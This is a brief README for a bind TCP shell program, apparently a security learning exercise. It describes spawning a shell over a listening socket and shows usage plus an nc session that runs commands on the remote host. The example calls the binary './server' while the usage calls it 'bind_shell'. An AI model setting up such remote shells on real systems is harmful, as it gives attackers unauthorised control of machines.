# Bind TCP Shell
The programm will listen on a command-line TCP port for inbound connections. <br>
When it receives a connection, it will make a execve syscall to get a shell on the remote machine and redirect to descriptors of the programm to our socket <br>

# How to execute
make <br>
./bind_shell -p 'tcp_port' -q 'queue_length' <br>
Where tcp_port is the number of the TCP port in which we want to receive connections, and queue_length is the queue_length of the incoming connections.

# Example on remote machine
./server -p 3000 -q 5 <br>
[*] Waiting for incoming connection on 0.0.0.0 at port 3000 <br>
Connection received from 192.168.15.18 in port 44508 managed by the process 22109 <br>

# Example on local machine 
nc -v 192.168.15.18 3000 <br>
Connection to 192.168.15.18 3000 port [tcp/*] succeeded! <br>
pwd<br>
/home/h4z4rd/bind_tcp_shell <br>
whoami<br>
h4z4rd<br>
